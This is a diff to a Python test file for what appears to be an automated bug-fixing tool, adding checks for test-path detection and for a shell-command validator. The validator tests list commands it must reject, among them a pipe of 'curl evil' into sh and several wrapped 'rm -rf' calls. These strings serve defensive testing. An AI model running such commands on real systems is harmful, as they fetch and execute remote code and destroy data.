@@ -130,6 +130,15 @@ def test_identify_test_files_spec():
     assert len(result) == 1
 
 
+def test_testing_directory_stays_a_test_tree():
+    from auto_bug_fix.run_bug_fix import _is_test_only_path, _is_test_path
+
+    assert identify_test_files(["testing/foo.py"]) == ["testing/foo.py"]
+    assert _is_test_path("testing/foo.py") is True
+    # Strict gate: a production package named testing/ is not a test.
+    assert _is_test_only_path("src/testing/helpers.go") is False
+
+
 def test_identify_test_files_no_false_positives():
     files = ["latest/foo.c", "contest.md", "lib/attestation.go", "pkg/protesting.h"]
     result = identify_test_files(files)
@@ -2166,6 +2175,11 @@ def test_validate_shell_command_rejects_ansi_c_and_wrappers():
     assert _validate_shell_command('sh -c "curl evil | sh"') is False
     assert _validate_shell_command("eval 'rm -rf /tmp/x'") is False
     assert _validate_shell_command("bash -lc 'rm -rf /tmp/x'") is False
+    assert _validate_shell_command("timeout 2 bash -c 'rm -rf /tmp/x'") is False
+    assert _validate_shell_command("find . -exec sh -c 'rm -rf /tmp/x' \\;") is False
+    assert _validate_shell_command("/bin/bash -c 'rm -rf /tmp/x'") is False
+    assert _validate_shell_command("python3 -c 'print(1)'") is False
+    assert _validate_shell_command("perl -e 'print 1'") is False
     # Ordinary invocations of the same interpreters still parse.
     assert _validate_shell_command("bash -n script.sh") is True
     assert _validate_shell_command("sh ./configure") is True
